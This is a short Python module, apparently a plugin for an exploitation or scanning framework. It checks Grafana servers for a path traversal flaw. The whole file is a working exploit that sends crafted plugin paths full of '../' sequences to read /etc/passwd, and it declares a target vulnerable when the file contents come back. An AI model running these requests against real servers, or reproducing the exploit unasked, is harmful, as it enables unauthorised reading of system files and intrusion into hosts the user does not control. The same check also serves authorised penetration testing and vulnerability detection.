import requests
from core.printmodels import *

class Grafana_Directory_Traversal:
    def __init__(self):
        self.name = "Grafana Path Traversal"
        self.description = "Grafana Directory Traversal and File Read"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            paths = [
                "/public/plugins/alertlist/../../../../../../../../etc/passwd",
                "/public/plugins/annolist/../../../../../../../../etc/passwd",
                "/public/plugins/alertmanager/../../../../../../../../etc/passwd"
            ]
            
            for path in paths:
                response = requests.get(f"{site}{path}", verify=False, timeout=10)
                if response.status_code == 200 and "root:" in response.text:
                    return PrintSuccess(f"[Grafana] Vulnerable to path traversal! Using path: {path}")
            return PrintFailed("[Grafana] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Grafana] Error: {str(e)}")
